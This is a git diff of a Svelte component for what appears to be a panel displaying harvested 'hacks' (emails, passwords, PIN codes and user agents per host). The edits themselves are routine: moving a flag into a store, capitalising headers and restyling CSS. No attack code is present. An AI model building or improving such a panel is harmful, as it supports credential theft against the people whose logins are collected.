@@ -7,24 +7,25 @@
   import moment from "moment";
   import { hacksList, user } from "$lib/stores/user-store";
   import { getUser, updateCheckpoint } from "$lib/users";
+    import { detailsShow } from "$lib/stores/states";
 
   export let hostUrl;
   export let suffix;
+  export let isShowHacker=false
 
-  let detailsShow = false;
 
   $: hacks = $hacksList;
   $: latesthacks = hacks.filter((el) => el.timestamp > $user.lastChecked);
 
   async function showhackView() {
     console.log("hacks to show", hacks, $hacksList);
-    detailsShow = true;
+    $detailsShow = true;
     await updateCheckpoint($user.uid);
     $user = await getUser($user.uid);
     localStorage.setItem("user", JSON.stringify($user));
   }
   function hidehackView() {
-    detailsShow = false;
+    $detailsShow = false;
   }
   function geturl(hoststring) {
     var url = hoststring.replace("_", ".");
@@ -65,7 +66,7 @@
     </div>
   </div>
 </div>
-{#if detailsShow}
+{#if $detailsShow}
   <div class="fixed-popup">
     <div class="table-wrapper">
 
@@ -75,17 +76,18 @@
       </div>
       <table>
         <tr>
-          <th>time</th>
-          <th>email</th>
-          <th>password</th>
-          <th>pin-code</th>
-          <th>userAgent</th>
+          <th>Time</th>
+  
+          <th>Email</th>
+          <th>Password</th>
+          <th>Pin-code</th>
+          <th>UserAgent</th>
           {#if $user.isAdmin}
-            <th>actions</th>
+            <th>Actions</th>
           {/if}
         </tr>
         {#each hacks as hack}
-          <HackData {hack} />
+          <HackData {hack}/>
         {/each}
       </table>
     </div>
@@ -106,10 +108,10 @@
   .fixed-popup{
     position: fixed;
     width: 100%;
-    height: 100%;
-    display: grid;
-    place-items: center;
-    top:0;
+    height: calc(100% - 92px);
+    display: flex;
+    justify-content: center;
+    top:92px;
     left: 0;
     overflow:auto;
     margin-top: 12px;
@@ -132,8 +134,8 @@
     border: 1px solid rgb(181 151 151);
   }
   .table-wrapper{
-    border: 1px solid gray;
-    background-color: white;
+    border: 2px solid rgba(128, 128, 128, 0.384);
+    background-color: rgb(255, 255, 255);
     border-radius: 8px;
 
   }
